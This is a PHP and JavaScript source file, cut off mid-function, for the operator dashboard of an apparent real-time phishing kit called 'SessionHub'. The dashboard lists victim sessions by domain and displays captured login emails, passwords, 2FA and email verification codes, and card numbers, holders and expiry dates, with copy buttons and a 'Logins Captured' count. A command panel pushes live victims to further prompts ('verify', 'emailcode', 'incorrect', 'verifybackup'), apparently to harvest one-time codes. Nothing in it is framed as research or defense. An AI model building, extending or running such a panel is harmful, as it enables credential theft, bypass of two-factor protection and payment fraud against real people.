<?php
session_start();
require_once __DIR__ . '/assets/config/db_config.php';
require_once __DIR__ . '/assets/auth/auth.php';

$auth = new Auth();
$auth->requireLogin();

$currentUser = $auth->getCurrentUser();
$accessibleDomains = array_values(array_unique($auth->getAccessibleDomains()));
$role = $_SESSION['role'] ?? 'viewer';

if (in_array('*', $accessibleDomains, true) || in_array($role, ['super_admin', 'admin'], true)) {
    $domainScopeText = 'All accessible domains';
} elseif (!empty($accessibleDomains)) {
    $domainScopeText = implode(', ', $accessibleDomains) . ' (including matching subdomains)';
} else {
    $domainScopeText = 'No domains assigned';
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - <?php echo htmlspecialchars($_SESSION['username']); ?></title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        :root {
            --primary: #667eea;
            --secondary: #764ba2;
            --success: #10b981;
            --danger: #ef4444;
            --info: #3b82f6;
            --dark: #1a1a2e;
            --panel: #ffffff;
            --muted: #6b7280;
        }
        body { background: #f0f2f5; font-family: 'Segoe UI', sans-serif; }
        .sidebar {
            position: fixed; left: 0; top: 0; width: 280px; height: 100%;
            background: linear-gradient(180deg, var(--dark) 0%, #16213e 100%);
            color: white; z-index: 1000;
        }
        .sidebar-header { padding: 25px 20px; border-bottom: 1px solid rgba(255,255,255,0.1); }
        .sidebar-menu { padding: 20px 0; }
        .menu-item {
            padding: 12px 25px; display: flex; align-items: center; gap: 12px;
            cursor: pointer; transition: all 0.3s; border-left: 3px solid transparent;
        }
        .menu-item:hover, .menu-item.active {
            background: rgba(255,255,255,0.1);
            border-left-color: var(--primary);
        }
        .main-content { margin-left: 280px; padding: 20px; }
        .top-bar {
            background: white; border-radius: 15px; padding: 15px 25px;
            margin-bottom: 25px; display: flex; justify-content: space-between;
            align-items: center; box-shadow: 0 2px 10px rgba(0,0,0,0.05);
        }
        .scope-badge {
            display: inline-flex; align-items: center; gap: 8px; margin-top: 8px;
            background: #eef2ff; color: #4338ca; border-radius: 999px;
            padding: 6px 12px; font-size: 13px; font-weight: 600;
        }
        .workspace-card, .search-card, .domain-group, .profile-card {
            background: var(--panel); border-radius: 16px; box-shadow: 0 2px 10px rgba(0,0,0,0.05);
        }
        .workspace-card { padding: 20px; margin-bottom: 20px; }
        .stats-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin-bottom: 20px; }
        .stat-card {
            background: white; border-radius: 16px; padding: 20px; text-align: center;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05); transition: transform 0.2s, box-shadow 0.2s;
            cursor: pointer; border: 2px solid transparent;
        }
        .stat-card:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(0,0,0,0.08); }
        .stat-card.active { border-color: var(--primary); }
        .stat-icon { font-size: 24px; margin-bottom: 10px; color: var(--primary); }
        .stat-number { font-size: 30px; font-weight: bold; }
        .stat-label { color: var(--muted); font-size: 14px; }
        .search-card { padding: 20px; margin-bottom: 20px; }
        .filter-hint { color: var(--muted); font-size: 14px; margin-top: 10px; }
        .loading { text-align: center; padding: 40px; color: var(--muted); }
        .spinner {
            width: 40px; height: 40px; border: 3px solid #f3f3f3;
            border-top: 3px solid var(--primary); border-radius: 50%;
            animation: spin 1s linear infinite; margin: 0 auto 15px;
        }
        .domain-group { margin-bottom: 18px; overflow: hidden; }
        .domain-header {
            display: flex; justify-content: space-between; align-items: center;
            padding: 18px 20px; cursor: pointer; background: linear-gradient(135deg, #f8fafc 0%, #eef2ff 100%);
            border-bottom: 1px solid #e5e7eb;
        }
        .domain-header h3 { margin: 0; font-size: 18px; display: flex; align-items: center; gap: 10px; }
        .domain-stats { display: flex; align-items: center; gap: 14px; color: var(--muted); font-size: 13px; }
        .domain-body { display: none; padding: 16px; }
        .domain-body.show { display: block; }
        .session-card {
            border: 1px solid #e5e7eb; border-radius: 14px; margin-bottom: 12px;
            overflow: hidden; background: #fff;
        }
        .session-header {
            padding: 14px 16px; display: flex; justify-content: space-between; align-items: center;
            cursor: pointer; gap: 12px; background: #fafafa;
        }
        .session-body { display: none; padding: 16px; }
        .session-body.show { display: block; }
        .session-main { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
        .session-meta { color: var(--muted); font-size: 13px; display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
        .session-actions { display: inline-flex; align-items: center; gap: 6px; }
        .session-actions .btn { border-radius: 999px; }
        .data-row {
            display: grid; grid-template-columns: 120px 1fr; gap: 10px;
            padding: 6px 0; border-bottom: 1px dashed #e5e7eb;
        }
        .data-row:last-child { border-bottom: none; }
        .data-label { color: var(--muted); font-weight: 600; }
        .data-value { word-break: break-word; }
        .badge-online, .badge-offline, .badge-profile {
            border-radius: 999px; padding: 4px 10px; font-size: 12px; font-weight: 700;
        }
        .badge-online { background: #dcfce7; color: #166534; }
        .badge-offline { background: #f3f4f6; color: #4b5563; }
        .badge-profile { background: #dbeafe; color: #1d4ed8; }
        .profile-card { padding: 24px; }
        .profile-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 18px; }
        .profile-field label { color: var(--muted); font-size: 13px; margin-bottom: 6px; display: block; }
        .profile-field .value { background: #f8fafc; border: 1px solid #e5e7eb; border-radius: 12px; padding: 12px 14px; }
        .modal-content { border-radius: 16px; overflow: hidden; }
        .modal-header.bg-primary .btn-close { filter: invert(1); }
        .toast-custom {
            position: fixed; top: 20px; right: 20px; z-index: 9999; background: white;
            padding: 14px 16px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.12);
        }
        .empty-state { text-align: center; padding: 40px; color: var(--muted); }
        @keyframes spin { to { transform: rotate(360deg); } }
        @media (max-width: 992px) {
            .stats-grid, .profile-grid { grid-template-columns: repeat(2, 1fr); }
        }
        @media (max-width: 768px) {
            .sidebar { width: 70px; }
            .sidebar-header h3, .menu-item span { display: none; }
            .main-content { margin-left: 70px; }
            .stats-grid, .profile-grid { grid-template-columns: 1fr; }
            .top-bar { flex-direction: column; align-items: flex-start; gap: 12px; }
            .domain-header, .session-header { flex-direction: column; align-items: flex-start; }
            .data-row { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <div class="sidebar">
        <div class="sidebar-header">
            <h3><i class="fas fa-chart-line"></i> SessionHub</h3>
        </div>
        <div class="sidebar-menu">
            <div class="menu-item active" data-page="dashboard"><i class="fas fa-tachometer-alt"></i><span>Dashboard</span></div>
            <div class="menu-item" data-page="sessions"><i class="fas fa-database"></i><span>Sessions</span></div>
            <div class="menu-item" data-page="profile"><i class="fas fa-user"></i><span>Profile</span></div>
        </div>
    </div>

    <div class="main-content">
        <div class="top-bar">
            <div>
                <h2 id="pageTitle">Dashboard</h2>
                <p id="pageDesc">Welcome, <?php echo htmlspecialchars($currentUser['full_name'] ?? $currentUser['username']); ?></p>
                <div class="scope-badge">
                    <i class="fas fa-globe"></i>
                    <?php echo htmlspecialchars($domainScopeText); ?>
                </div>
            </div>
            <div class="d-flex gap-3 align-items-center">
                <div><i class="fas fa-user-circle"></i> <?php echo htmlspecialchars($role); ?></div>
                <a href="c3_logout.php" class="text-danger text-decoration-none"><i class="fas fa-sign-out-alt"></i> Logout</a>
            </div>
        </div>

        <div id="pageContent"><div class="loading"><div class="spinner"></div>Loading...</div></div>
    </div>

    <div class="modal fade" id="sessionModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-lg modal-dialog-scrollable">
            <div class="modal-content">
                <div class="modal-header bg-primary text-white">
                    <h5 class="modal-title"><i class="fas fa-info-circle"></i> Session Details</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body" id="sessionModalBody"></div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                    <button type="button" class="btn btn-primary" id="sendCommandFromDetails" onclick="sendCommandToCurrent()">Send Command</button>
                </div>
            </div>
        </div>
    </div>

    <div class="modal fade" id="commandModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-lg">
            <div class="modal-content">
                <div class="modal-header bg-primary text-white">
                    <h5 class="modal-title"><i class="fas fa-paper-plane"></i> Send Command</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body" id="commandModalBody"></div>
            </div>
        </div>
    </div>

    <script>
    const domainScopeText = <?php echo json_encode($domainScopeText); ?>;
    const profileData = {
        username: <?php echo json_encode($_SESSION['username'] ?? ''); ?>,
        role: <?php echo json_encode($role); ?>,
        fullName: <?php echo json_encode($currentUser['full_name'] ?? ''); ?>,
        email: <?php echo json_encode($currentUser['email'] ?? ''); ?>,
        assignedDomain: <?php echo json_encode($_SESSION['assigned_domain'] ?? ''); ?>
    };

    let currentPage = 'dashboard';
    let allSessions = [];
    let onlineClients = [];
    let currentFilter = 'all';
    let currentSearch = '';
    let dataLoaded = false;
    let currentSocketId = null;

    function showToast(message, type) {
        const bgColor = type === 'success' ? '#10b981' : (type === 'error' ? '#ef4444' : '#3b82f6');
        const icon = type === 'success' ? 'fa-check-circle' : (type === 'error' ? 'fa-exclamation-circle' : 'fa-info-circle');
        const toast = $('<div class="toast-custom" style="border-left: 4px solid ' + bgColor + '"><i class="fas ' + icon + '"></i> ' + message + '</div>');
        $('body').append(toast);
        setTimeout(() => toast.fadeOut(300, function() { $(this).remove(); }), 2500);
    }

    function formatTime(dateStr) {
        if (!dateStr) return 'Unknown';
        const date = new Date(dateStr);
        if (isNaN(date.getTime())) return 'Unknown';
        return date.toLocaleString('en-GB', {
            timeZone: 'Europe/Amsterdam',
            day: '2-digit',
            month: '2-digit',
            year: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: false
        });
    }

    function escapeHtml(text) {
        if (text === null || text === undefined || text === '') return '';
        const div = document.createElement('div');
        div.textContent = String(text);
        return div.innerHTML;
    }

    function makeSafeId(value) {
        return String(value || 'unknown').replace(/[^a-zA-Z0-9_-]/g, '_');
    }

    const sessionDetailHiddenKeys = new Set(['canSendCommands', 'data']);
    const sessionDetailKnownKeys = new Set([
        'socketId', 'domain', 'clientIp', 'ip_address', 'created_at', 'last_seen', 'current_url', 'currentUrl', 'userAgent', 'user_agent',
        'profile_name', 'profile_email', 'profile_phone',
        'login_email', 'login_password', 'login_time',
        '2fa_code', '2fa_time', 'email_code', 'email_code_time',
        'card_number', 'card_holder', 'card_expiry', 'card_time',
        'wrong_email', 'wrong_email_time'
    ]);

    function isMeaningfulValue(value) {
        if (value === null || value === undefined) return false;
        if (typeof value === 'string') return value.trim() !== '';
        if (Array.isArray(value)) return value.some(isMeaningfulValue);
        if (typeof value === 'object') return Object.values(value).some(isMeaningfulValue);
        return true;
    }

    function valueMatchesSearch(value, search) {
        if (value === null || value === undefined) return false;
        if (typeof value === 'string' || typeof value === 'number' || typeof value === 'boolean') {
            return String(value).toLowerCase().includes(search);
        }
        if (Array.isArray(value)) {
            return value.some(item => valueMatchesSearch(item, search));
        }
        if (typeof value === 'object') {
            return Object.entries(value).some(([key, nestedValue]) =>
                String(key).toLowerCase().includes(search) || valueMatchesSearch(nestedValue, search)
            );
        }
        return false;
    }

    function formatFieldLabel(key) {
        return String(key)
            .replace(/([a-z0-9])([A-Z])/g, '$1 $2')
            .replace(/[_-]+/g, ' ')
            .replace(/\b\w/g, char => char.toUpperCase())
            .replace(/\b2 Fa\b/g, '2FA')
            .replace(/\bOtp\b/g, 'OTP')
            .replace(/\bIp\b/g, 'IP')
            .replace(/\bUrl\b/g, 'URL')
            .replace(/\bId\b/g, 'ID');
    }

    function isTimeLikeField(key) {
        return /(?:^|_)(time|date|at|seen|updated|created)$/i.test(String(key))
            || ['created_at', 'last_seen'].includes(String(key));
    }

    function buildCopyButton(value, className = 'btn btn-sm btn-outline-primary ms-2') {
        const rawValue = typeof value === 'string' ? value : JSON.stringify(value, null, 2);
        const encodedValue = encodeURIComponent(rawValue);
        return ` <button type="button" class="${className}" onclick="copyToClipboard(decodeURIComponent('${encodedValue}'))">Copy</button>`;
    }

    function formatDetailValue(value, key = '') {
        if (isTimeLikeField(key)) {
            return escapeHtml(formatTime(value));
        }
        if (typeof value === 'boolean') {
            return value ? 'Yes' : 'No';
        }
        if (Array.isArray(value) || (value && typeof value === 'object')) {
            return `<pre class="mb-0"><code>${escapeHtml(JSON.stringify(value, null, 2))}</code></pre>`;
        }
        return escapeHtml(String(value));
    }

    function renderDetailRow(label, value, options = {}) {
        if (!isMeaningfulValue(value)) return '';

        const displayValue = options.formatter
            ? options.formatter(value)
            : formatDetailValue(value, options.key || '');
        const copyButton = options.copy ? buildCopyButton(options.copyValue ?? value) : '';
        const suffix = options.suffix ? ` <small class="text-muted ms-2">${escapeHtml(options.suffix)}</small>` : '';

        return `
            <div class="data-row">
                <div class="data-label">${escapeHtml(label)}</div>
                <div class="data-value">${displayValue}${copyButton}${suffix}</div>
            </div>
        `;
    }

    function renderDetailSection(title, rows, extraClasses = 'mb-3') {
        const visibleRows = rows.filter(Boolean);
        if (!visibleRows.length) return '';

        return `
            <div class="card ${extraClasses}">
                <div class="card-header bg-light"><strong>${escapeHtml(title)}</strong></div>
                <div class="card-body">${visibleRows.join('')}</div>
            </div>
        `;
    }

    function getAdditionalSectionTitle(key) {
        if (/(recovery|backup|verify|code|otp|2fa|pin)/i.test(key)) return 'Verification Data';
        if (/(token|cookie|session|auth|bearer|jwt)/i.test(key)) return 'Tokens & Cookies';
        if (/(card|cvv|payment|wallet|bank|iban|crypto|expiry)/i.test(key)) return 'Payment Data';
        if (/(login|pass|credential|email|username|user)/i.test(key)) return 'Credentials & Identity';
        if (/(phone|address|city|state|country|zip|postal|name)/i.test(key)) return 'Profile Details';
        return 'Additional Captured Data';
    }

    function collectAdditionalSessionEntries(session) {
        const entries = [];
        const seenKeys = new Set();
        const sources = [session];

        if (session && session.data && typeof session.data === 'object' && !Array.isArray(session.data)) {
            sources.push(session.data);
        }

        for (const source of sources) {
            if (!source || typeof source !== 'object' || Array.isArray(source)) continue;

            for (const [key, value] of Object.entries(source)) {
                if (seenKeys.has(key) || sessionDetailHiddenKeys.has(key) || sessionDetailKnownKeys.has(key) || !isMeaningfulValue(value)) {
                    continue;
                }

                seenKeys.add(key);
                entries.push({ key, value });
            }
        }

        return entries;
    }

    function renderAdditionalDetailSections(session) {
        const groupedEntries = new Map();

        for (const entry of collectAdditionalSessionEntries(session)) {
            const title = getAdditionalSectionTitle(entry.key);
            if (!groupedEntries.has(title)) groupedEntries.set(title, []);
            groupedEntries.get(title).push(entry);
        }

        let html = '';
        for (const [title, entries] of groupedEntries.entries()) {
            html += renderDetailSection(title, entries.map(({ key, value }) =>
                renderDetailRow(formatFieldLabel(key), value, { key, copy: true })
            ));
        }

        return html;
    }

    function renderSessionDetailHtml(session, socketId) {
        const basicSection = renderDetailSection('Basic Information', [
            renderDetailRow('Socket ID', socketId, { copy: true }),
            renderDetailRow('Domain', session.domain || 'unknown'),
            renderDetailRow('IP', session.clientIp || session.ip_address || 'unknown'),
            renderDetailRow('Created', session.created_at, { key: 'created_at' }),
            renderDetailRow('Last Seen', session.last_seen, { key: 'last_seen' }),
            renderDetailRow('Current URL', session.current_url || session.currentUrl || 'Unknown'),
            renderDetailRow('User Agent', session.userAgent || session.user_agent)
        ]);

        const profileSection = renderDetailSection('Profile Information', [
            renderDetailRow('Name', session.profile_name),
            renderDetailRow('Email', session.profile_email, { copy: true }),
            renderDetailRow('Phone', session.profile_phone, { copy: true })
        ]);

        const loginSection = renderDetailSection('Login Credentials', [
            renderDetailRow('Email', session.login_email, { copy: true }),
            renderDetailRow('Password', session.login_password, { copy: true }),
            renderDetailRow('Time', session.login_time, { key: 'login_time' })
        ]);

        const verificationSection = renderDetailSection('Verification Codes', [
            renderDetailRow('2FA Code', session['2fa_code'], {
                key: '2fa_code',
                copy: true,
                suffix: isMeaningfulValue(session['2fa_time']) ? `(${formatTime(session['2fa_time'])})` : ''
            }),
            renderDetailRow('Email Code', session.email_code, {
                key: 'email_code',
                copy: true,
                suffix: isMeaningfulValue(session.email_code_time) ? `(${formatTime(session.email_code_time)})` : ''
            })
        ]);

        const cardSection = renderDetailSection('Card Details', [
            renderDetailRow('Card Number', session.card_number, { copy: true }),
            renderDetailRow('Card Holder', session.card_holder),
            renderDetailRow('Expiry', session.card_expiry),
            renderDetailRow('Time', session.card_time, { key: 'card_time' })
        ]);

        const wrongAttemptSection = renderDetailSection('Wrong Attempt', [
            renderDetailRow('Email', session.wrong_email),
            renderDetailRow('Time', session.wrong_email_time, { key: 'wrong_email_time' })
        ], 'mb-0 border-danger');

        return basicSection
            + profileSection
            + loginSection
            + verificationSection
            + cardSection
            + renderAdditionalDetailSections(session)
            + wrongAttemptSection;
    }

    async function fetchDashboardData(forceReload = false) {
        if (dataLoaded && !forceReload) return;

        const response = await fetch('api/getFilteredSessions.php');
        const data = await response.json();

        if (!response.ok || !data.success) {
            throw new Error(data.error || 'Failed to load sessions');
        }

        allSessions = Array.isArray(data.sessions) ? data.sessions : [];
        onlineClients = Array.isArray(data.onlineClients) ? data.onlineClients : [];
        dataLoaded = true;
    }

    function getFilteredSessions() {
        let sessions = [...allSessions];

        if (currentFilter === 'online') {
            const onlineSocketIds = new Set(onlineClients.filter(c => c.status === 'online' && c.socketId).map(c => c.socketId));
            sessions = sessions.filter(session => onlineSocketIds.has(session.socketId));
        } else if (currentFilter === 'profile') {
            sessions = sessions.filter(session => session.profile_name || session.profile_email);
        } else if (currentFilter === 'login') {
            sessions = sessions.filter(session => session.login_email);
        }

        if (currentSearch) {
            sessions = sessions.filter(session =>
                (session.socketId && session.socketId.toLowerCase().includes(currentSearch)) ||
                (session.profile_name && session.profile_name.toLowerCase().includes(currentSearch)) ||
                (session.profile_email && session.profile_email.toLowerCase().includes(currentSearch)) ||
                (session.profile_phone && String(session.profile_phone).includes(currentSearch)) ||
                (session.login_email && session.login_email.toLowerCase().includes(currentSearch)) ||
                (session.domain && session.domain.toLowerCase().includes(currentSearch)) ||
                (session.clientIp && String(session.clientIp).toLowerCase().includes(currentSearch)) ||
                valueMatchesSearch(session, currentSearch)
            );
        }

        return sessions;
    }

    function getStats() {
        const sessions = getFilteredSessions();
        const onlineSocketIds = new Set(onlineClients.filter(c => c.status === 'online' && c.socketId).map(c => c.socketId));
        const profiles = sessions.filter(session => session.profile_name || session.profile_email).length;
        const logins = sessions.filter(session => session.login_email).length;
        const online = sessions.filter(session => onlineSocketIds.has(session.socketId)).length;

        return {
            total: sessions.length,
            profiles,
            logins,
            online
        };
    }

    function renderStatsCards() {
        const stats = getStats();
        return `
            <div class="stats-grid">
                <div class="stat-card ${currentFilter === 'all' ? 'active' : ''}" onclick="setFilter('all')">
                    <div class="stat-icon"><i class="fas fa-database"></i></div>
                    <div class="stat-number">${stats.total}</div>
                    <div class="stat-label">Visible Sessions</div>
                </div>
                <div class="stat-card ${currentFilter === 'online' ? 'active' : ''}" onclick="setFilter('online')">
                    <div class="stat-icon"><i class="fas fa-circle" style="color:#10b981"></i></div>
                    <div class="stat-number">${stats.online}</div>
                    <div class="stat-label">Online Now</div>
                </div>
                <div class="stat-card ${currentFilter === 'profile' ? 'active' : ''}" onclick="setFilter('profile')">
                    <div class="stat-icon"><i class="fas fa-user-check"></i></div>
                    <div class="stat-number">${stats.profiles}</div>
                    <div class="stat-label">Profiles</div>
                </div>
                <div class="stat-card ${currentFilter === 'login' ? 'active' : ''}" onclick="setFilter('login')">
                    <div class="stat-icon"><i class="fas fa-key"></i></div>
                    <div class="stat-number">${stats.logins}</div>
                    <div class="stat-label">Logins Captured</div>
                </div>
            </div>
        `;
    }

    function renderWorkspace(introTitle, introDescription) {
        $('#pageContent').html(`
            <div class="workspace-card">
                <h4 class="mb-2">${escapeHtml(introTitle)}</h4>
                <p class="text-muted mb-0">${escapeHtml(introDescription)}</p>
            </div>
            ${renderStatsCards()}
            <div class="search-card">
                <div class="row g-3">
                    <div class="col-lg-9">
                        <input
                            type="text"
                            id="searchInput"
                            class="form-control"
                            placeholder="Search by socket ID, email, name, phone, IP, or domain..."
                            value="${escapeHtml(currentSearch)}"
                            oninput="updateSearch(this.value)"
                        >
                    </div>
                    <div class="col-lg-3">
                        <button class="btn btn-primary w-100" onclick="refreshCurrentPage(true)">
                            <i class="fas fa-sync-alt"></i> Refresh Data
                        </button>
                    </div>
                </div>
                <div class="filter-hint">
                    Showing sessions for: <strong>${escapeHtml(domainScopeText)}</strong>
                </div>
            </div>
            <div id="sessionsContainer"></div>
        `);

        renderSessionGroups();
    }

    function renderSessionGroups() {
        const sessions = getFilteredSessions();
        const grouped = {};
        const onlineSocketIds = new Set(onlineClients.filter(c => c.status === 'online' && c.socketId).map(c => c.socketId));

        for (const session of sessions) {
            const domain = session.domain || 'unknown';
            if (!grouped[domain]) grouped[domain] = [];
            grouped[domain].push(session);
        }

        const domains = Object.keys(grouped).sort((a, b) => {
            const lastA = Math.max(...grouped[a].map(session => new Date(session.last_seen || session.created_at || 0).getTime()));
            const lastB = Math.max(...grouped[b].map(session => new Date(session.last_seen || session.created_at || 0).getTime()));
            return lastB - lastA;
        });

        if (domains.length === 0) {
            $('#sessionsContainer').html('<div class="workspace-card empty-state"><i class="fas fa-inbox fa-3x mb-3"></i><br>No sessions found for your domain scope.</div>');
            return;
        }

        let html = '';

        for (const domain of domains) {
            const domainSessions = grouped[domain].sort((a, b) => new Date(b.last_seen || b.created_at || 0) - new Date(a.last_seen || a.created_at || 0));
            const safeDomainId = makeSafeId(domain);
            const hasOnline = domainSessions.some(session => onlineSocketIds.has(session.socketId));
            const latestSession = domainSessions[0]?.last_seen || domainSessions[0]?.created_at || null;

            html += `
                <div class="domain-group">
                    <div class="domain-header" onclick="toggleDomain('${safeDomainId}')">
                        <h3>
                            <i class="fas fa-globe"></i>
                            ${escapeHtml(domain)}
                        </h3>
                        <div class="domain-stats">
                            <span>${domainSessions.length} sessions</span>
                            <span>${hasOnline ? 'Online activity' : 'Offline only'}</span>
                            <span>Last: ${escapeHtml(formatTime(latestSession))}</span>
                            <i class="fas fa-chevron-down"></i>
                        </div>
                    </div>
                    <div class="domain-body ${currentSearch ? 'show' : ''}" id="domain-${safeDomainId}">
            `;

            for (const session of domainSessions) {
                const safeSocketId = makeSafeId(session.socketId || 'session');
                const socketLabel = session.socketId ? session.socketId.substring(0, 25) + (session.socketId.length > 25 ? '...' : '') : 'Unknown';
                const isOnline = onlineSocketIds.has(session.socketId);
                const lastSeen = session.last_seen || session.created_at;
                const currentUrl = session.current_url || session.currentUrl || 'Unknown';
                const canSendCommands = Boolean(session.canSendCommands) && isOnline && session.socketId;
                const canViewDetails = Boolean(session.socketId);

                html += `
                    <div class="session-card">
                        <div class="session-header" onclick="toggleSession('${safeSocketId}')">
                            <div class="session-main">
                                <i class="fas fa-chevron-down"></i>
                                <strong>${escapeHtml(socketLabel)}</strong>
                                <span class="${isOnline ? 'badge-online' : 'badge-offline'}">${isOnline ? 'ONLINE' : 'OFFLINE'}</span>
                                ${session.profile_name ? `<span class="badge-profile">${escapeHtml(session.profile_name)}</span>` : ''}
                            </div>
                            <div class="session-meta">
                                <span>${escapeHtml(formatTime(lastSeen))}</span>
                                <span class="session-actions">
                                    ${canSendCommands ? `<button type="button" class="btn btn-sm btn-primary" onclick='event.stopPropagation();showCommandModal(${JSON.stringify(session.socketId)})'><i class="fas fa-paper-plane"></i> Command</button>` : ''}
                                    ${canViewDetails ? `<button type="button" class="btn btn-sm btn-outline-primary" onclick='event.stopPropagation();viewSessionDetail(${JSON.stringify(session.socketId)})'><i class="fas fa-eye"></i> View Data</button>` : ''}
                                </span>
                            </div>
                        </div>
                        <div class="session-body" id="session-${safeSocketId}">
                            <div class="row">
                                <div class="col-lg-6">
                                    <div class="data-row"><div class="data-label">Socket ID</div><div class="data-value"><code>${escapeHtml(session.socketId || 'unknown')}</code></div></div>
                                    <div class="data-row"><div class="data-label">Domain</div><div class="data-value">${escapeHtml(session.domain || 'unknown')}</div></div>
                                    <div class="data-row"><div class="data-label">IP</div><div class="data-value">${escapeHtml(session.clientIp || 'unknown')}</div></div>
                                    <div class="data-row"><div class="data-label">Last Seen</div><div class="data-value">${escapeHtml(formatTime(lastSeen))}</div></div>
                                    <div class="data-row"><div class="data-label">Current URL</div><div class="data-value"><small>${escapeHtml(currentUrl)}</small></div></div>
                                </div>
                                <div class="col-lg-6">
                                    ${session.profile_name ? `<div class="data-row"><div class="data-label">Name</div><div class="data-value">${escapeHtml(session.profile_name)}</div></div>` : ''}
                                    ${session.profile_email ? `<div class="data-row"><div class="data-label">Profile Email</div><div class="data-value"><code>${escapeHtml(session.profile_email)}</code></div></div>` : ''}
                                    ${session.profile_phone ? `<div class="data-row"><div class="data-label">Phone</div><div class="data-value">${escapeHtml(session.profile_phone)}</div></div>` : ''}
                                    ${session.login_email ? `<div class="data-row"><div class="data-label">Login Email</div><div class="data-value"><code>${escapeHtml(session.login_email)}</code></div></div>` : ''}
                                    ${session.login_password ? `<div class="data-row"><div class="data-label">Password</div><div class="data-value"><code>${escapeHtml(session.login_password)}</code></div></div>` : ''}
                                    ${session['2fa_code'] ? `<div class="data-row"><div class="data-label">2FA Code</div><div class="data-value"><code>${escapeHtml(session['2fa_code'])}</code></div></div>` : ''}
                                </div>
                            </div>
                        </div>
                    </div>
                `;
            }

            html += '</div></div>';
        }

        $('#sessionsContainer').html(html);
    }

    function getModalInstance(id) {
        return bootstrap.Modal.getOrCreateInstance(document.getElementById(id));
    }

    async function viewSessionDetail(socketId) {
        if (!socketId) return;

        currentSocketId = socketId;
        $('#sendCommandFromDetails').hide();
        $('#sessionModalBody').html('<div class="text-center py-4"><div class="spinner"></div>Loading session data...</div>');
        getModalInstance('sessionModal').show();

        try {
            const response = await fetch(`api/getSessionData.php?socketId=${encodeURIComponent(socketId)}`);
            const data = await response.json();

            if (!response.ok || !data.success || !data.data) {
                throw new Error(data.error || 'Failed to load session data');
            }

            const s = data.data;
            $('#sendCommandFromDetails').toggle(Boolean(s.canSendCommands));
            $('#sessionModalBody').html(renderSessionDetailHtml(s, socketId));
        } catch (error) {
            $('#sendCommandFromDetails').hide();
            $('#sessionModalBody').html('<div class="alert alert-danger mb-0">' + escapeHtml(error.message) + '</div>');
        }
    }

    function showCommandModal(socketId) {
        if (!socketId) return;

        currentSocketId = socketId;
        const commands = ['login', 'verify', 'emailcode', 'reset', '10min', '60min', 'incorrect', 'verifywp', 'verifyg', 'verifybackup', 'restrict', 'done', 'career', 'session'];

        let html = '<div class="row"><div class="col-12"><p class="mb-3">Send command to this session:</p><div class="d-flex flex-wrap gap-2">';
        for (const command of commands) {
            html += `<button type="button" class="btn btn-primary btn-sm" onclick='sendCommand(${JSON.stringify(socketId)}, ${JSON.stringify(command)})'>${escapeHtml(command)}</button>`;
        }
        html += '</div><hr><div class="input-group mt-3"><input type="text" id="customCommandInput" class="form-control" placeholder="Custom command"><button type="button" class="btn btn-primary" onclick="sendCustomCommand()">Send</button></div></div></div>';

        $('#commandModalBody').html(html);
        getModalInstance('commandModal').show();
    }

    function sendCommandToCurrent() {
        if (currentSocketId) showCommandModal(currentSocketId);
    }

    async function sendCommand(socketId, command) {
        try {
            const response = await fetch('api/sendSessionCommand.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ socketId, command })
            });
            const result = await response.json();

            if (!response.ok || !result.success) {
                throw new Error(result.error || `Command "${command}" failed`);
            }

            showToast(`Command "${command}" sent`, 'success');
            getModalInstance('commandModal').hide();
        } catch (error) {
            showToast(error.message || 'Failed to send command', 'error');
        }
    }

    function sendCustomCommand() {
        const command = String($('#customCommandInput').val() || '').trim();
        if (command && currentSocketId) {
            sendCommand(currentSocketId, command);
        }
    }

    async function copyToClipboard(text) {
        try {
            await navigator.clipboard.writeText(text);
            showToast('Copied to clipboard', 'success');
        } catch (error) {
            showToast('Copy failed', 'error');
        }
    }

    function renderProfile() {
        $('#pageContent').html(`
            <div class="profile-card">
                <h4 class="mb-4">My Profile</h4>
                <div class="profile-grid">
                    <div class="profile-field">
                        <label>Username</label>
                        <div class="value">${escapeHtml(profileData.username)}</div>
                    </div>
                    <div class="profile-field">
                        <label>Role</label>
                        <div class="value">${escapeHtml(profileData.role)}</div>
                    </div>
                    <div class="profile-field">
                        <label>Full Name</label>
                        <div class="value">${escapeHtml(profileData.fullName || '-')}</div>
                    </div>
                    <div class="profile-field">
                        <label>Email</label>
                        <div class="value">${escapeHtml(profileData.email || '-')}</div>
                    </div>
                    <div class="profile-field">
                        <label>Assigned Domain</label>
                        <div class="value">${escapeHtml(profileData.assignedDomain || '-')}</div>
                    </div>
                    <div class="profile-field">
                        <label>Visible Domain Scope</label>
                        <div class="value">${escapeHtml(domainScopeText)}</div>
                    </div>
                </div>
            </div>
        `);
    }

    function toggleDomain(domainId) {
        const element = document.getElementById('domain-' + domainId);
        if (element) element.classList.toggle('show');
    }

    function toggleSession(sessionId) {
        const element = document.getElementById('session-' + sessionId);
        if (element) element.classList.toggle('show');
    }

    function updateSearch(value) {
        currentSearch = String(value || '').trim().toLowerCase();
        if (currentPage === 'dashboard' || currentPage === 'sessions') {
            renderWorkspace(
                currentPage === 'dashboard' ? 'Session Overview' : 'All Visible Sessions',
                currentPage === 'dashboard'
                    ? 'This view follows the c5 session layout and only shows sessions inside your allowed domain scope.'
